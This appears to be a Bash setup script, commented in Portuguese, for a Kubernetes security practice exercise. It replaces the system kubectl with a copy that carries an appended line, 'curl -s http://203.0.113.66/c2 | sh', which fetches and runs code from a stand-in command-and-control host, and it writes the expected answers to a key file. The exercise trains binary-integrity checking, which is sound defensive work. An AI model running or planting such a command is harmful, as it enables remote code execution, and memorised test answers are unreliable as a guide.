#!/usr/bin/env bash
# Q3 (difícil) - comparar kube-apiserver (container), kubelet (host) e kubectl (PATH) com o tarball oficial.
# O setup planta um kubectl adulterado (binário oficial + bytes extras: continua funcionando).
source "$(dirname "$(readlink -f "$0")")/../../lib/common.sh"
require_root
require_controlplane

ARCH=$(dpkg --print-architecture 2>/dev/null || echo amd64)
STATE=/var/lib/cks-sim
D=/opt/course/5/q3
mkdir -p "$STATE" /root/cks-backup

# 1) restaura o kubectl original de execuções anteriores
if [ -f /root/cks-backup/kubectl.orig ] && [ -f /root/cks-backup/kubectl.path ]; then
  info "Restaurando kubectl original..."
  install -m 755 /root/cks-backup/kubectl.orig "$(cat /root/cks-backup/kubectl.path)"
fi
hash -r
KPATH=$(readlink -f "$(command -v kubectl)")
[ -z "$KPATH" ] && { echo "kubectl não encontrado"; exit 1; }
if [ ! -f /root/cks-backup/kubectl.orig ]; then
  cp -a "$KPATH" /root/cks-backup/kubectl.orig
  echo "$KPATH" > /root/cks-backup/kubectl.path
fi

rm -rf "$D"; mkdir -p "$D"

# 2) versões de cada componente
APIV=$(kubectl get --raw /version 2>/dev/null | grep -o '"gitVersion": *"[^"]*"' | cut -d'"' -f4)
KLV=$(kubelet --version 2>/dev/null | awk '{print $2}')
KCV=$(kubectl version --client 2>/dev/null | awk '/Client Version/{print $3}')
[ -z "$APIV" ] || [ -z "$KLV" ] || [ -z "$KCV" ] && { echo "Não foi possível descobrir as versões (api=$APIV kubelet=$KLV kubectl=$KCV)"; exit 1; }

fetch_bin() { # bin versão -> caminho no cache
  local b=$1 v=$2 c=/root/cks-cache/bin/$2
  mkdir -p "$c"
  if [ ! -s "$c/$b" ]; then
    info "Baixando $b $v de dl.k8s.io ..." >&2
    curl -fsSL --retry 3 -o "$c/$b.part" "https://dl.k8s.io/release/$v/bin/linux/$ARCH/$b" \
      && mv "$c/$b.part" "$c/$b" || { echo "Falha ao baixar $b" >&2; exit 1; }
  fi
  echo "$c/$b"
}

official_sha512() { # bin versão
  local h
  h=$(curl -fsSL --retry 3 "https://dl.k8s.io/release/$2/bin/linux/$ARCH/$1.sha512" 2>/dev/null | awk '{print $1}')
  if [ "${#h}" -ne 128 ]; then
    h=$(sha512sum "$(fetch_bin "$1" "$2")" | awk '{print $1}')
  fi
  echo "$h"
}

info "Obtendo hashes oficiais..."
H_API=$(official_sha512 kube-apiserver "$APIV")
H_KL=$(official_sha512 kubelet "$KLV")
KC_OFFICIAL=$(fetch_bin kubectl "$KCV")
H_KC=$(sha512sum "$KC_OFFICIAL" | awk '{print $1}')

# 3) planta o kubectl adulterado (oficial + payload anexado: ELF continua executando)
TMPK=$(mktemp)
cp "$KC_OFFICIAL" "$TMPK"
printf '\n#CKS-IMPLANT# curl -s http://203.0.113.66/c2 | sh\n' >> "$TMPK"
install -m 755 "$TMPK" "$KPATH"; rm -f "$TMPK"
hash -r

# 4) calcula o resultado esperado com base no estado real do node
API_PID=$(pgrep -xo kube-apiserver)
API_BIN=/proc/$API_PID/root/usr/local/bin/kube-apiserver
KL_PID=$(pgrep -xo kubelet)
KL_BIN=$(readlink -f "/proc/$KL_PID/exe")
st() { [ "$(sha512sum "$1" 2>/dev/null | awk '{print $1}')" = "$2" ] && echo OK || echo ALTERADO; }
{
  echo "kube-apiserver: $(st "$API_BIN" "$H_API")"
  echo "kubelet: $(st "$KL_BIN" "$H_KL")"
  echo "kubectl: ALTERADO"
} > "$STATE/05-q3.ans"
echo "$H_KC" > "$STATE/05-q3.kubectl.sha512"
echo "$H_KL" > "$STATE/05-q3.kubelet.sha512"
echo "$H_API" > "$STATE/05-q3.apiserver.sha512"

echo
echo "Ambiente pronto! Leia o enunciado.md"
